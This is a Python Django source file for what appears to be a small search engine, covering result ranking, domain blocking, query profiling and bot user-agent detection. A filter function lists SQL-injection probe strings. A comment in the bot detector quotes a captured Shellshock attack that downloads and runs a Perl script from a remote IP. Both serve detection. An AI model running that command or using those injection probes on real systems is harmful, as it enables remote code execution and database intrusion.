    records = eval(term.page_rankings)
    search_result = {}
    for record in records:
        try:
            item = site_model.objects.get(id=record[0])
            if item.pagedescription:
                description = item.pagedescription[0:320]
            elif item.pagetext:
                description = item.pagetext[0:320]
            else:
                description = None
            # We restrict the description to 320 chars or 45 words, whichever is shorter.
            if description:
                description = truncatewords(description, 45)
            title = ''
            if item.pagetitle:
                title = item.pagetitle[0:120]
            if search_result.has_key(item.rooturl):
                search_result[item.rooturl]['urls'].append({ 'url': item.url, 'id': item.id, 'score': record[1], 'title': item.pagetitle, 'description': description })
            # If the item has "www." but we have a non-www of the domain in the search results.
            elif item.rooturl.startswith('www.') and search_result.has_key(item.rooturl[4:]):
                if verbose:
                    print 'JsonifyIndexTerm: WWW site {0} has non-WWW version in results.'.format(item.rooturl)
                search_result[item.rooturl[4:]]['urls'].append({ 'url': item.url, 'id': item.id, 'score': record[1], 'title': item.pagetitle, 'description': description })
                search_result[item.rooturl[4:]]['alternateurl'] = item.rooturl
                # This is unnecessary because the URLs come to us sorted highest to lowest score, so the first one
                # in already has the highest score.
                #topurl = search_result[item.rooturl[4:]]['urls'][0]['url']
                #highest = urlparse.urlparse(topurl).netloc
                #if highest != item.rooturl[4:]:
                #    print u'WWW is most prominently shown and highest scoring item is {0}. We will switch these'.format(highest)
                #    search_result[highest] = search_result.pop(item.rooturl[4:])
            # If the item does not have "www." but we have a "www." version of the domain in the search results.
            elif not item.rooturl.startswith('www.') and search_result.has_key('www.' + item.rooturl):
                if verbose:
                    print 'JsonifyIndexTerm: non-WWW site {0} has WWW version in results.'.format(item.rooturl)
                search_result['www.' + item.rooturl]['urls'].append({ 'url': item.url, 'id': item.id, 'score': record[1], 'title': item.pagetitle, 'description': description })
                search_result['www.' + item.rooturl]['alternateurl'] = item.rooturl
                # This is unnecessary because the URLs come to us sorted highest to lowest score, so the first one
                # in already has the highest score.
                #topurl = search_result['www.' + item.rooturl]['urls'][0]['url']
                #highest = urlparse.urlparse(topurl).netloc
                #if highest != ('www.' + item.rooturl):
                #    print u'non-WWW is most prominently shown and highest scoring item is {0}. We will switch these'.format(highest)
                #    search_result[highest] = search_result.pop('www.' + item.rooturl)
            else:
                search_result[item.rooturl] = { 'score': record[1], 'urls': [{ 'url': item.url, 'id': item.id, 'score': record[1], 'title': title, 'description': description },] }
        except ObjectDoesNotExist:
            pass
    for key, value in search_result.iteritems():
        # Need to sort by highest order first before truncating.
        search_result[key]['urls'] = sorted(value['urls'], key=lambda item: item['score'], reverse=True)[0:50]
        # Extra points for more than one URL for that keyword.
        num_urls = len(search_result[key]['urls'])
        search_result[key]['score'] = value['urls'][0]['score'] + GetUrlCountScore(num_urls)
    # Need to sort first, then truncate results.
    search_results = sorted(search_result.iteritems(), key=lambda item: item[1]['score'], reverse=True)[0:limit]
    term.search_results = json.dumps(search_results)
    if save:
        term.save()
    # Now we need to update the term rankings.
    ranking_model = GetKeywordRankingModelFromLanguage(language)
    existing = ranking_model.objects.filter(keywords=term).delete()
    rank = 1
    show = True
    if term.refused:
        show = False
    for result in search_results:
        #print u'{0} ranks {1} for {2}'.format(result[0], rank, term)
        rankitem = ranking_model()
        rankitem.rooturl = result[0]
        rankitem.keywords = term
        rankitem.rank = rank
        rankitem.show = show
        rankitem.save()
        alternateurl = result[1].get('alternateurl', None)
        if alternateurl:
            if verbose:
                print u'JsonifyIndexTerm: Site {0} also has alternate URL of {1}'.format(result[0], alternateurl)
            altrankitem = ranking_model()
            altrankitem.rooturl = alternateurl
            altrankitem.keywords = term
            altrankitem.rank = rank
            altrankitem.show = show
            altrankitem.save()
        rank = rank + 1
    return term

# Gets the bonus for a site based on the number of URLs
def GetUrlCountScore(num_urls):
    """
    Gets the bonus for a site based on the number of URLs. If a site has a bunch
    of URLs that match the query, it's more likely to be relevant to the general
    topic.

    Note that having 50 URLs is a major score boost -- about the same as having the
    keyword in the page title.
    """
    if num_urls >= 50:
        return 11
    elif num_urls >= 44:
        return 10
    elif num_urls >= 36:
        return 9
    elif num_urls >= 29:
        return 8
    elif num_urls >= 23:
        return 7
    elif num_urls >= 18:
        return 6
    elif num_urls >= 14:
        return 5
    elif num_urls >= 10:
        return 4
    elif num_urls >= 7:
        return 3
    elif num_urls >= 4:
        return 2
    elif num_urls >= 2:
        return 1
    return 0

def AddError(url, short_desc, full_desc):
    url.num_errors = url.num_errors + 1
    if url.num_errors < 5:
        url.error_info = url.error_info + str(datetime.date.today()) + ', ' + short_desc + ', ' + full_desc + '\n'
        url.save()
    else:
        url.delete()

def ClearErrors(url):
    url.num_errors = 0
    url.error_info = ''
    url.save()

def AddPendingTerm(item, language_code='en', reason=None):
    if BannedSearchString(item):
        return
    pending_model = GetPendingIndexModelFromLanguage(language_code)
    # Don't index things that only have a quote on one side - trim them.
    if item.startswith(u"'") and not item.endswith(u"'"):
        item = item[1:]
    elif item.endswith(u"'") and not item.startswith(u"'"):
        item = item[:-1]
    elif item.startswith(u'"') and not item.endswith(u'"'):
        item = item[1:]
    elif item.endswith(u'"') and not item.startswith(u'"'):
        item = item[:-1]
    if item.endswith(u'|'):
        item = item[0:-1]
    item = item.lower()
    try:
        existing = pending_model.objects.get(keywords=item)
    except ObjectDoesNotExist:
        new_index = pending_model()
        new_index.keywords = item
        if reason and len(reason) > 239:
            reason = reason[0:240]
        new_index.reason = reason
        # This can happen if two searches happen at once and there's a race condition.
        try:
            new_index.save()
        except:
            pass

# Try to search for a specific search term or phrase. If found, return
# it. Otherwise, add it to the pending terms and return None.
def TrySearchTerm(text, language_code):
    term_model = GetIndexModelFromLanguage(language_code)
    lowerterm = text.lower().strip()
    if lowerterm.startswith(u"'") and not lowerterm.endswith(u"'"):
        lowerterm = lowerterm[1:]
    elif lowerterm.endswith(u"'") and not lowerterm.startswith(u"'"):
        lowerterm = lowerterm[:-1]
    elif lowerterm.startswith(u'"') and not lowerterm.endswith(u'"'):
        lowerterm = lowerterm[1:]
    elif lowerterm.endswith(u'"') and not lowerterm.startswith(u'"'):
        lowerterm = lowerterm[:-1]
    if lowerterm.endswith(u'|'):
        lowerterm = lowerterm[0:-1]
    if lowerterm.endswith(u'/'):
        lowerterm = lowerterm[0:-1]
    if u'%%20' in lowerterm:
        lowerterm.replace('%%20', ' ')
    if u'%20' in lowerterm:
        lowerterm.replace('%20', ' ')
    try:
        term = term_model.objects.get(keywords=lowerterm)
        return term
    except ObjectDoesNotExist:
        AddPendingTerm(lowerterm, language_code, u'Search {0} not indexed yet.'.format(text))
        return None

# Try to search for a specific term or collection of terms from a list.
# Combine these terms and return the result.
#def TrySearchTerms(terms, language_code):

# Do a title-only search for a phrase and create an index term for it.
# Make sure that what is searched for is added to the pending terms so
# we can generate a proper index.
def CreatePlaceholderIndexTerm(text, language_code):
    text = text.lower().strip()
    start = timezone.now()
    term_model = GetIndexModelFromLanguage(language_code)
    site_model = GetSiteInfoModelFromLanguage(language_code)
    try:
        term = term_model.objects.get(keywords=text)
        # Do nothing and just return it if it's found.
        return term
    except ObjectDoesNotExist:
        term = term_model()
        term.keywords = text
        term.search_results = '{}'
        term.num_results = 0
    results = []
    tmp_results = site_model.objects.filter(pagetitle__icontains=text)[:200]
    # A page title is worth 100 points in a placeholder term because we consider it an exact perfect match
    # until it has been indexed.
    for item_result in tmp_results:
        results.append([item_result.id, 100])
    term.num_results = len(results)
    term.page_rankings = str(results)
    if term.num_results > 0:
        end_delta = timezone.now() - start
        term.index_time = end_delta.total_seconds()
        term.save()
        term = JsonifyIndexTerm(term, language_code)
    # Add this to pending so we get a non-half-assed version.
    AddPendingTerm(text, language_code, u'Search {0} not indexed yet.'.format(text))
    return term

def GenerateIndexStats(save=False):
    stats = IndexStats(total_urls=0, total_indexes=0, total_pendingindexes=0)
    stats.num_excluded = BlockedSite.objects.count()

    langs = []
    for lang in language_list:
        langdata = {}
        term_model = GetIndexModelFromLanguage(lang)
        pendingindex_model = GetPendingIndexModelFromLanguage(lang)
        site_model = GetSiteInfoModelFromLanguage(lang)
        langdata['lang'] = language_names[lang]
        langdata['count'] = site_model.objects.count()
        langdata['indexes'] = term_model.objects.count()
        langdata['pending_indexes'] = pendingindex_model.objects.count()
        stats.total_urls += langdata['count']
        stats.total_indexes += langdata['indexes']
        stats.total_pendingindexes += langdata['pending_indexes']
        stats.most_linked_to_domains = json.dumps(list(DomainInfo.objects.filter(domains_linking_in_last_updated__isnull=False).order_by('-domains_linking_in').values('url', 'domains_linking_in'))[0:100])
        langs.append(langdata)
    langs.sort(key=lambda item: item['lang'])
    stats.langs = json.dumps(langs)
    if save:
        stats.save()
    return stats

# Generates a monthly search report for the specified month, or for the current month
# if no month or year is specified.
def GenerateSearchReport(save=False, month=None, year=None, lang='en'):
    # Set date range.
    d = datetime.date.today()
    if not month and not year:
        first = datetime.date(d.year, d.month, 1)
        last = datetime.date(d.year, d.month+1, 1)
    else:
        yea = int(year)
        mon = int(month)
        if yea > d.year or (yea == d.year and mon > d.month):
            raise Http404
        first = datetime.date(yea, mon, 1)
        if mon == 12:
            mon = 0
            yea += 1
        last = datetime.date(yea, mon+1, 1)

    try:
        report = MonthlySearchReport.objects.get(month=month, year=year, language=lang)
        print u'Report already exists for {0}-{1} in {2}. Replacing.'.format(year, month, lang)
    except ObjectDoesNotExist:
        report = MonthlySearchReport()
        report.month = first.month
        report.year = first.year
        report.language = lang
    searchlog_model = GetSearchLogModelFromLanguage(lang)
    searches = searchlog_model.objects.filter(last_search__gte=first, last_search__lt=last)
    report.total_searches = searches.count()
    searches = searches.values('keywords').annotate(Count('keywords')).order_by('-keywords__count')[0:200]
    report.top_searches = json.dumps(list(searches))
    if save:
        report.save()
    print str(report.total_searches) + ' searches in ' + report.language + ' in ' + str(report.year) + '-' + str(report.month)
    return report

def GenerateMonthlySearchReports(month=None, year=None, language=None):
    # Only index the specified language.
    if language:
        GenerateSearchReport(True, month, year, language)
        return
    # If language is not specified, index everything.
    for lang in language_list:
        GenerateSearchReport(True, month, year, lang)


def LogQueries(queries):
    print "Queries: %s" % len(queries)
    totaltime = 0.0
    domaininfo = 0.0
    domaininfototal = 0
    domaininfoupdate = 0.0
    domaininfoupdatetotal = 0
    domaininfoinsert = 0.0
    domaininfoinserttotal = 0
    siteinfo = 0.0
    siteinfototal = 0
    siteinfoinsert = 0.0
    siteinfoinserttotal = 0
    siteinfoupdate = 0.0
    siteinfoupdatetotal = 0
    bigselect = 0.0
    bigselecttotal = 0
    indexterm = 0.0
    indextermtotal = 0
    pendingindex = 0.0
    pendingindextotal = 0
    indextermupdate = 0.0
    indextermupdatetotal = 0
    indexterminsert = 0.0
    indexterminserttotal = 0
    pendingindexdelete = 0.0
    pendingindexdeletetotal = 0
    pendingurl = 0.0
    pendingurltotal = 0
    pendingurlinsert = 0.0
    pendingurlinserttotal = 0
    pendingurldelete = 0.0
    pendingurldeletetotal = 0
    BlockedSite = 0.0
    BlockedSitetotal = 0
    domainextension = 0.0
    domainextensiontotal = 0
    keywordranking = 0.0
    keywordrankingtotal = 0
    settingselect = 0.0
    settingselecttotal = 0
    urlparamselect = 0.0
    urlparamselecttotal = 0
    urllinkselect = 0.0
    urllinkselecttotal = 0
    urllinkinsert = 0.0
    urllinkinserttotal = 0
    other = 0.0
    othertotal = 0.0
    for query in queries:
        sql = query['sql']
        totaltime += float(query['time'])
        if query['sql'].startswith('SELECT "dir_domaininfo"'):
            domaininfo += float(query['time'])
            domaininfototal += 1
        elif query['sql'].startswith('UPDATE "dir_domaininfo"'):
            domaininfoupdate += float(query['time'])
            domaininfoupdatetotal += 1
        elif query['sql'].startswith('INSERT INTO "dir_domaininfo'):
            domaininfoinsert += float(query['time'])
            domaininfoinserttotal += 1
        elif query['sql'].startswith('SELECT "dir_urlparameter"'):
            urlparamselect += float(query['time'])
            urlparamselecttotal += 1
        elif query['sql'].startswith('SELECT COUNT(*) FROM "dir_urlparameter"'):
            urlparamselect += float(query['time'])
            urlparamselecttotal += 1
        elif query['sql'].startswith('SELECT "dir_urllink"'):
            urllinkselect += float(query['time'])
            urllinkselecttotal += 1
        elif query['sql'].startswith('INSERT INTO "dir_urllink"'):
            urllinkinsert += float(query['time'])
            urllinkinserttotal += 1
        elif query['sql'].startswith('SELECT "site_info"'):
            siteinfo += float(query['time'])
            siteinfototal += 1
        elif query['sql'].startswith('SELECT COUNT(*) FROM "site_info"'):
            siteinfo += float(query['time'])
            siteinfototal += 1
        # International site info
        elif query['sql'].startswith('SELECT COUNT(*) FROM "dir_siteinfo_'):
            siteinfo += float(query['time'])
            siteinfototal += 1
        elif query['sql'].startswith('SELECT "dir_siteinfo_'):
            siteinfo += float(query['time'])
            siteinfototal += 1
        elif query['sql'].startswith('INSERT INTO "site_info"'):
            siteinfoinsert += float(query['time'])
            siteinfoinserttotal += 1
        # International site info
        elif query['sql'].startswith('INSERT INTO "dir_siteinfo_'):
            siteinfoinsert += float(query['time'])
            siteinfoinserttotal += 1
        elif query['sql'].startswith('UPDATE "site_info"'):
            siteinfoupdate += float(query['time'])
            siteinfoupdatetotal += 1
        # International site info.
        elif query['sql'].startswith('UPDATE "dir_siteinfo_'):
            siteinfoupdate += float(query['time'])
            siteinfoupdatetotal += 1
        elif query['sql'].startswith('SELECT id, rooturl'):
            bigselect += float(query['time'])
            bigselecttotal += 1
        # Drop end quote so we pick up index selects from all languages.
        elif query['sql'].startswith('SELECT "dir_indexterm'):
            indexterm += float(query['time'])
            indextermtotal += 1
        # Drop end quote so we pick up pending index selects from all languages.
        elif query['sql'].startswith('SELECT "dir_pendingindex'):
            pendingindex += float(query['time'])
            pendingindextotal += 1
        elif query['sql'].startswith('UPDATE "dir_indexterm'):
            indextermupdate += float(query['time'])
            indextermupdatetotal += 1
        elif query['sql'].startswith('INSERT INTO "dir_indexterm'):
            indexterminsert += float(query['time'])
            indexterminserttotal += 1
        elif query['sql'].startswith('DELETE FROM "dir_pendingindex'):
            pendingindexdelete += float(query['time'])
            pendingindexdeletetotal += 1
        elif query['sql'].startswith('SELECT "dir_pendingurl"'):
            pendingurl += float(query['time'])
            pendingurltotal += 1
        elif query['sql'].startswith('SELECT "dir_crawlableurl"'):
            pendingurl += float(query['time'])
            pendingurltotal += 1
        elif query['sql'].startswith('INSERT INTO "dir_pendingurl"'):
            pendingurlinsert += float(query['time'])
            pendingurlinserttotal += 1
        elif query['sql'].startswith('DELETE FROM "dir_pendingurl"'):
            pendingurldelete += float(query['time'])
            pendingurldeletetotal += 1
        elif query['sql'].startswith('INSERT INTO "dir_crawlableurl"'):
            pendingurlinsert += float(query['time'])
            pendingurlinserttotal += 1
        elif query['sql'].startswith('DELETE FROM "dir_crawlableurl"'):
            pendingurldelete += float(query['time'])
            pendingurldeletetotal += 1
        elif query['sql'].startswith('SELECT "dir_blockedsite"'):
            BlockedSite += float(query['time'])
            BlockedSitetotal += 1
        elif query['sql'].startswith('SELECT "dir_domainsuffix"'):
            domainextension += float(query['time'])
            domainextensiontotal += 1
        elif query['sql'].startswith('DELETE FROM "dir_keywordranking'):
            keywordranking += float(query['time'])
            keywordrankingtotal += 1
        elif query['sql'].startswith('INSERT INTO "dir_keywordranking'):
            keywordranking += float(query['time'])
            keywordrankingtotal += 1
        elif query['sql'].startswith('SELECT "dir_keywordranking'):
            keywordranking += float(query['time'])
            keywordrankingtotal += 1
        elif query['sql'].startswith('SELECT "dir_setting"'):
            settingselect += float(query['time'])
            settingselecttotal += 1
        else:
            print query
            other += float(query['time'])
            othertotal += 1

    print 'Domain Info Selects: {0} ({1} seconds)'.format(domaininfototal, domaininfo)
    print 'Domain Info Updates: {0} ({1} seconds)'.format(domaininfoupdatetotal, domaininfoupdate)
    print 'Domain Info Inserts: {0} ({1} seconds)'.format(domaininfoinserttotal, domaininfoinsert)
    print 'Site Info Selects: {0} ({1} seconds)'.format(siteinfototal, siteinfo)
    print 'Site Info Inserts: {0} ({1} seconds)'.format(siteinfoinserttotal, siteinfoinsert)
    print 'Site Info Updates: {0} ({1} seconds)'.format(siteinfoupdatetotal, siteinfoupdate)
    print 'Index Term Selects: {0} ({1} seconds)'.format(indextermtotal, indexterm)
    print 'Index Term Updates: {0} ({1} seconds)'.format(indextermupdatetotal, indextermupdate)
    print 'Index Term Inserts: {0} ({1} seconds)'.format(indexterminserttotal, indexterminsert)
    print 'Pending Index Selects: {0} ({1} seconds)'.format(pendingindextotal, pendingindex)
    print 'Pending Index Deletes: {0} ({1} seconds)'.format(pendingindexdeletetotal, pendingindexdelete)
    print 'Crawlable URL Selects: {0} ({1} seconds)'.format(pendingurltotal, pendingurl)
    print 'Crawlable URL Inserts: {0} ({1} seconds)'.format(pendingurlinserttotal, pendingurlinsert)
    print 'Crawlable URL Deletes: {0} ({1} seconds)'.format(pendingurldeletetotal, pendingurldelete)
    print 'URL Parameter Selects: {0} ({1} seconds)'.format(urlparamselecttotal, urlparamselect)
    print 'URL Link Selects: {0} ({1} seconds)'.format(urllinkselecttotal, urllinkselect)
    print 'URL Link Inserts: {0} ({1} seconds)'.format(urllinkinserttotal, urllinkinsert)
    print 'Blocked Site Selects: {0} ({1} seconds)'.format(BlockedSitetotal, BlockedSite)
    print 'Domain Suffix Selects: {0} ({1} seconds)'.format(domainextensiontotal, domainextension)
    print 'Setting Selects: {0} ({1} seconds)'.format(settingselecttotal, settingselect)
    print 'Keyword Ranking Selects, Inserts, and Deletes: {0} ({1} seconds)'.format(keywordrankingtotal, keywordranking)
    print 'Big Select Selects: {0} ({1} seconds)'.format(bigselecttotal, bigselect)
    print 'Other: {0} ({1} seconds)'.format(othertotal, other)

    return totaltime

def PornBlock(item):
    """
    Takes a SiteInfo and blocks it, removes its URLs, blocks its parent, and removes the
    parent's URLs, unless the site is taggged as unblockable, in which case it just removes
    the SiteInfo from the database. If the parent is unblockable, it only removes the domain
    itself.
    """
    parsedurl = urlparse.urlparse(item.url)
    try:
        domain = DomainInfo.objects.get(url=parsedurl.netloc)
        # If this domain is unblockable, then just delete the URL, because if someone checked
        # blog they at least want to nuke the URLs they just selected.
        if domain.is_unblockable:
            print 'Domain is unblockable, just deleting URL {0}'.format(item.url)
            item.delete()
            return
    except ObjectDoesNotExist:
        pass
    # For this type of site, we block the root url first. Then the actual url.
    # We also set it to block all subdomains by default (but don't check them
    # at block time yet)
    rootdomain = GetRootDomain(item.rooturl)
    print u'Rootdomain is {0}'.format(rootdomain)
    # Track whether the root domain is unblockable.
    unblockable = False
    try:
        domain = DomainInfo.objects.get(url=rootdomain)
        if domain.is_unblockable:
            print u'Root domain {0} is unblockable.'.format(rootdomain)
            unblockable = True
    except ObjectDoesNotExist:
        pass
    # If the root domain does not match the current domain, block the root and clear out its
    # URLs, provided the root is not unblockable.
    if (rootdomain != item.rooturl) and not unblockable:
        print u'Removing URLs for root domain {0}.'.format(rootdomain)
        RemoveURLsForDomain(rootdomain)
        try:
            site = BlockedSite.objects.get(url=rootdomain)
            print u'Root domain {0} was already blocked. That is odd.'.format(rootdomain)
        except ObjectDoesNotExist:
            print u'Adding BlockedSite for root domain {0}.'.format(rootdomain)
            site = BlockedSite()
            site.url = rootdomain
            site.reason = 4
            site.exclude_subdomains = True
            site.save()
        RequeueRankedKeywordsForDomain(rootdomain)
    # Or, if this *is* the root domain, clear out all of the URLs, provided they are not blockable.
    # Technically, the "domain is root" and blockable case will never be true due to the check at the
    # beginning of this function, so we just go ahead and block.
    print u'Blocking URLs for domain {0}'.format(parsedurl.netloc)
    RemoveURLsForDomain(parsedurl.netloc)
    try:
        existing = BlockedSite.objects.get(url=parsedurl.netloc)
        print u'Domain {0} was already blocked. That is odd.'.format(item.rooturl)
    except ObjectDoesNotExist:
        print u'Adding BlockedSite for domain {0}.'.format(item.rooturl)
        site = BlockedSite()
        site.url = parsedurl.netloc
        site.reason = 4
        if (rootdomain == item.rooturl) and not unblockable:
            site.exclude_subdomains = True
        site.save()
    RequeueRankedKeywordsForDomain(parsedurl.netloc)

def BannedSearchString(text):
    #print 'Checking {0} for banned search string.'.format(text)
    if text.endswith(u'a=0') or text.endswith(u'A=0') or u'11111111' in text or u'999999' in text or u'sleep(3)' in text or u'result: ' in text or u'concat((select' in text or u'unhex(hex(' in text or u'name_const(char(' in text or u'rk=0' in text or u'1=1' in text or u'1=2' in text:
        return True
    try:
        bad = BadQuery.objects.get(keywords=text)
        return True
    except ObjectDoesNotExist:
        pass
    return False

def RequeueRankedKeywordsForDomain(domain):
    """
    When a domain is blocked, this should be called to queue all the keywords that it
    ranks for to be reindexed.

    This is not language-infix-aware.
    """
    lang = 'en'
    try:
        dinfo = DomainInfo.objects.get(url=domain)
        if dinfo.language_association:
            lang = dinfo.language_association
    except ObjectDoesNotExist:
        pass
    ranking_model = GetKeywordRankingModelFromLanguage(lang)
    pending_model = GetPendingIndexModelFromLanguage(lang)
    index_model = GetIndexModelFromLanguage(lang)
    ranks = ranking_model.objects.filter(rooturl=domain)
    for rank in ranks:
        # Don't flag items that don't show up in the top 200 results for reindex.
        if rank.rank > 200:
            continue
        try:
            keyword = index_model.objects.get(keywords=rank.keywords)
            # Don't queue keywords for blocked search terms. No need to index porn
            # search terms more frequently than non-blocked terms.
            if keyword.actively_blocked:
                continue
        except ObjectDoesNotExist:
            # This should actually never happen.
            pass
        try:
            existing = pending_model.objects.get(keywords=rank.keywords)
        except ObjectDoesNotExist:
            pending = pending_model()
            pending.keywords = rank.keywords
            reason = u'Domain {0} blocked and it ranks {1} for {2}'.format(domain, rank.rank, rank.keywords)
            if len(reason) > 240:
                reason = reason[0:240]
            pending.reason = reason
            pending.save()

def IsBotAgent(text):
    # Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
    if u'Googlebot' in text:
        return True
    # Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
    if u'bingbot' in text:
        return True
    # Mozilla/5.0 (compatible; Applebot/0.3; +http://www.apple.com/go/applebot)
    if u'Applebot' in text:
        return True
    # Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6 - James BOT - WebCrawler http://cognitiveseo.com/bot.html
    if u'James BOT' in text:
        return True
    # Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)
    if u'MJ12bot' in text:
        return True
    # Mozilla/5.0 (compatible; linkdexbot/2.0; +http://www.linkdex.com/bots/)
    if u'linkdexbot' in text:
        return True
    # Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
    if u'Yahoo! Slurp' in text:
        return True
    # msnbot/0.01 (+http://search.msn.com/msnbot.htm)
    # msnbot/2.0b (+http://search.msn.com/msnbot.htm)
    # msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)
    if u'msnbot' in text:
        return True
    # New-Sogou-Spider/1.0 (compatible; MSIE 5.5; Windows 98)
    if u'Sogou' in text:
        return True
    # LinkedInBot/1.0 (compatible; Mozilla/5.0; Jakarta Commons-HttpClient/3.1 +http://www.linkedin.com)
    if u'LinkedInBot' in text:
        return True
    # ia_archiver
    # ia_archiver (+http://www.alexa.com/site/help/webmasters; crawler@alexa.com)
    if u'ia_archiver' in text:
        return True
    # rogerbot/1.0 (http://moz.com/help/pro/what-is-rogerbot-, rogerbot-crawler+shiny@moz.com)
    # rogerbot/1.0 (http://moz.com/help/pro/what-is-rogerbot-, rogerbot-wherecat@moz.com)
    if u'rogerbot' in text:
        return True
    # Mozilla/5.0 (compatible; linkdexbot/2.0; +http://www.linkdex.com/bots/)
    if u'linkdexbot' in text:
        return True
    # Raven Link Checker
    if u'Raven Link Checker' in text:
        return True
    # Mozilla/5.0 (compatible; Gluten Free Crawler/1.0; +http://glutenfreepleasure.com/)
    if u'Gluten Free Crawler' in text:
        return True
    # Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http://megaindex.com/crawler)
    if u'MegaIndex.ru' in text:
        return True
    # Mozilla/5.0 (compatible; XoviBot/2.0; +http://www.xovibot.net/)
    if u'XoviBot' in text:
        return True
    # tbot-nutch/Nutch-1.10
    if u'nutch' in text:
        return True
    # Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)
    if u'YandexBot' in text:
        return True
    # Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)
    if u'AhrefsBot' in text:
        return True
    # Wget/1.15 (linux-gnu)
    if u'Wget' in text:
        return True
    # Go HTTP Client
    if u'Go-http-client' in text:
        return True
    # Dispatch/0.11.1-SNAPSHOT
    if u'Dispatch/0' in text:
        return True
    # Apache-HttpClient/4.3.5 (java 1.5)
    if u'Apache-HttpClient' in text:
        return True
    # Scrapy/0.24.6 (+http://scrapy.org)
    if u'Scrapy/' in text:
        return True
    # VegeBot
    if u'VegeBot' in text:
        return True
    # Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9465214528223723633)
    if u'Feedfetcher-Google' in text:
        return True
    # Mozilla/5.0 (compatible; Seznam screenshot-generator 2.1; +http://fulltext.sblog.cz/screenshot/)
    if u'Seznam screenshot-generator' in text:
        return True
    # Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
    if u'Baiduspider' in text:
        return True
    # BaiduSpider
    if u'BaiduSpider' in text:
        return True
    # Mozilla/5.0 (compatible; archive.org_bot +http://www.archive.org/details/archive.org_bot)
    if u'archive.org_bot' in text:
        return True
    # EventMachine HttpClient
    if u'EventMachine HttpClient' in text:
        return True
    # Mozilla/5.0 (compatible; seplinkbot/1.0 )
    if u'seplinkbot' in text:
        return True
    # Mozilla/5.0 (compatible; spbot/4.4.2; +http://OpenLinkProfiler.org/bot )
    if u'spbot' in text:
        return True
    # Mozilla/5.0 (compatible; WBSearchBot/1.1; +http://www.warebay.com/bot.html)
    if u'WBSearchBot' in text:
        return True
    # CakePHP
    if u'CakePHP' in text:
        return True
    # Ruby
    if u'Ruby' in text:
        return True
    # GarlikCrawler/1.2 (http://garlik.com/, crawler@garlik.com)
    if u'GarlikCrawler' in text:
        return True
    # Mozilla/5.0 (compatible; proximic; +http://www.proximic.com/info/spider.php)
    if u'proximic' in text:
        return True
    # BCKLINKS 1.0
    if u'BCKLINKS' in text:
        return True
    # Xenu Link Sleuth/1.3.8
    if u'Xenu Link Sleuth' in text:
        return True
    # Blackboard Safeassign
    if u'Blackboard Safeassign' in text:
        return True
    # Curious George - www.analyticsseo.com/crawler
    if u'Curious George' in text:
        return True
    # facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
    if u'facebookexternalhit' in text:
        return True
    # vq_web_crawler AppEngine-Google; (+http://code.google.com/appengine; appid: s~vayoola-q)
    if u'vq_web_crawler' in text:
        return True
    # sqlmap/1.0-dev (http://sqlmap.org)
    if u'sqlmap' in text:
        return True
    # Mozilla/5.0 (compatible; Cliqzbot/1.0 +http://cliqz.com/company/cliqzbot)
    if u'Cliqzbot' in text:
        return True
    # PHPCrawl
    if u'PHPCrawl' in text:
        return True
    # Niki-Bot
    if u'Niki-Bot' in text:
        return True
    # HTMLParser/2.0
    if u'HTMLParser' in text:
        return True
    # Wotbox/2.01 (+http://www.wotbox.com/bot/)
    if u'Wotbox' in text:
        return True
    # GigablastOpenSource/1.0
    if u'GigablastOpenSource' in text:
        return True
    # libwww-perl/6.05
    if u'libwww-perl' in text:
        return True
    # Java/1.8.0_51
    if u'Java/' in text:
        return True
    # python-requests/2.7.0 CPython/3.4.0 Linux/3.13.0-48-generic
    if u'python-requests' in text:
        return True
    # Mozilla/5.0 (Windows NT 6.2) Insitesbot/1.0
    if u'Insitesbot' in text:
        return True
    # Domain Re-Animator Bot (http://domainreanimator.com) - support@domainreanimator.com
    if u'Domain Re-Animator' in text:
        return True
    # Y!J-ASR/0.1 crawler (http://www.yahoo-help.jp/app/answers/detail/p/595/a_id/42716/)
    if u'Y!J-ASR' in text:
        return True
    # Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; Girafabot; girafabot at girafa dot com; http://www.girafa.com)
    if u'Girafabot' in text:
        return True
    # Mozilla/5.0 (compatible; GoogleDocs; apps-spreadsheets; +http://docs.google.com)
    if u'GoogleDocs' in text:
        return True
    # Grammarly/1.0 (http://www.grammarly.com)
    if u'Grammarly' in text:
        return True
    # BDFetch
    if u'BDFetch' in text:
        return True
    # sfFeedReader/0.9
    if u'sfFeedReader' in text:
        return True
    # w3af.org
    if u'w3af.org' in text:
        return True
    # Mozilla/4.0 (compatible; Synapse)
    if u'Synapse' in text:
        return True
    # Mozilla/5.0 (compatible; memoryBot/1.21.14 +http://mignify.com/bot.html)
    if u'memoryBot' in text:
        return True
    # US!
    # Mozilla/5.0 (compatible; WbSrch/1.1 +http://wbsrch.com)
    if u'WbSrch' in text:
        return True
    # ltx71 - (http://ltx71.com/)
    if u'ltx71' in text:
        return True
    # Mozilla/5.0 (compatible; CsQuery/1.3)
    if u'CsQuery' in text:
        return True
    # Mozilla/5.0 (compatible; aiHitBot/2.9; +http://www.aihitdata.com/about)
    if u'aiHitBot' in text:
        return True
    # SBL-BOT (http://sbl.net)
    if u'SBL-BOT' in text:
        return True
    # Pizilla++ ver 2.45
    if u'Pizilla++' in text:
        return True
    # Python-urllib/2.7
    if u'Python-urllib' in text:
        return True
    # Ghetto hack attempt
    # () { :;}; /bin/bash -c "curl -O http://103.1.185.91//b00t.pl -o /tmp/b00t.pl; lwp-download -a http://103.1.185.91/b00t.pl /tmp/b00t.pl;wget http://103.1.185.91/b00t.pl -O /tmp/b00t.pl;perl /tmp/b00t.pl;rm -f /tmp/b00t.pl*;mkdir /tmp/b00t.pl"
    if u'/bin/bash' in text:
        return True
    # Screaming Frog SEO Spider/2.11
    # Screaming Frog SEO Spider/2.20
